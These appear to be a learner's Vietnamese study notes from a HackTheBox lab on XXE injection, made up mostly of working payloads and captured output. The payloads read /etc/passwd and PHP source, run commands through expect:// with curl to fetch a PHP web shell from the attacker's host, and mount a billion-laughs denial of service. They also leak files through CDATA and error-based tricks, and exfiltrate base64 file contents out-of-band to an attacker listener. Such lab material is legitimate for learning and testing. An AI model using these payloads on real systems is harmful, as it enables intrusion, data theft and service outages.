# XML External Entity (XXE) Injection

Nó là cgi đó mình không giỏi XXE lắm 


request bình thường là 
```
POST /submitDetails.php HTTP/1.1
Host: 10.129.234.170
Content-Length: 152
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.234.170
Referer: http://10.129.234.170/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?>
<root>
<name>123</name>
<tel>12312312312</tel>
<email>123@htb.com</email>
<message>123123123123</message>
</root>
```


Thao túng lợi dụng XXE bằng cách thêm dòng này. Khởi tạo company gán nó thành "Inlane Freight"
```
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```
Chứng minh lỗi XSS bằng cách gọi &company; nên dùng với giá trị có hiển thị đầu ra để còn chứng minh 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
<root>
<name>123</name>
<tel>12312312312</tel>
<email> &company;</email>
<message>123123123123</message>
</root>
```
Response lúc này sẽ là 
```
Check your email  Inlane Freight for further instructions.
```

## Reading Sensitive Files

```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
<root>
<name>123</name>
<tel>12312312312</tel>
<email>&company;</email>
<message>123123123123</message>
</root>
```
Tương tự trên, in biến company ra thì sẽ ra kết quả 
```
Check your email  root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

## Reading Sensitive Files using PHP
```
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<root>
<name>123</name>
<tel>12312312312</tel>
<email>&company;</email>
<message>123123123123</message>
</root>
```

## Remote Code Execution with XXE

Prepare 
```
naruto3co@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
naruto3co@htb[/htb]$ sudo python3 -m http.server 80
```

Payload 
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

## Other XXE Attacks
```
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY a0 "DOS" >
  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
<root>
<name></name>
<tel></tel>
<email>&a10;</email>
<message></message>
</root>
```

## Advanced Exfiltration with CDATA

```
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```



```
<!ENTITY joined "%begin;%file;%end;">
```

Prepare
```
naruto3co@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
naruto3co@htb[/htb]$ python3 -m http.server 8000

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now, we can reference our external entity (xxe.dtd) and then print the &joined; entity we defined above, which should contain the content of the submitDetails.php file, as follows:
```
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```

## Error Based XXE
Khi ứng dụng parse XML nhưng không trả về output, ta không thể đọc dữ liệu trực tiếp → Blind XXE.
Nếu ứng dụng hiển thị lỗi runtime (PHP error/warning) và không xử lý exception đúng cách, ta có thể khai thác Error-Based XXE bằng cách ép XML parser ném lỗi và chèn dữ liệu vào thông báo lỗi.

Điều kiện
  XML parser cho phép entity
  Lỗi được hiển thị ra response
  Không có exception handling

Bước 1 – Kiểm tra error disclosure
```
<root>
  <email>&nonExistingEntity;</email>
</root>
```

Nếu server trả lỗi → có thể khai thác tiếp.

Bước 2 – Tạo DTD độc hại (xxe.dtd)
```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

→ Kết hợp entity không tồn tại + nội dung file để ép parser ném lỗi chứa dữ liệu file.

Bước 3 – Gọi DTD từ XML
```
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

→ Parser tải DTD, gây lỗi và leak nội dung file trong error message.

Ghi chú
  Có thể đọc source code bằng cách đổi đường dẫn file
  Không ổn định với file dài hoặc ký tự đặc biệt
  Kém tin cậy hơn OOB XXE



## Blind Data Exfiltration

 Có máy victim và attacker nhé 

 attacker tạo 2 file index.php và xxe.dtd


 index.php 
 ```
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

xxe.dtd
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```


gửi request tới victim dạng 
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://10.10.15.45:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>
<name>123</name>
<tel>123</tel>
<email>&content;</email>      // đoạn content này phải khớp nhé 
<message>123</message>
</root>
```



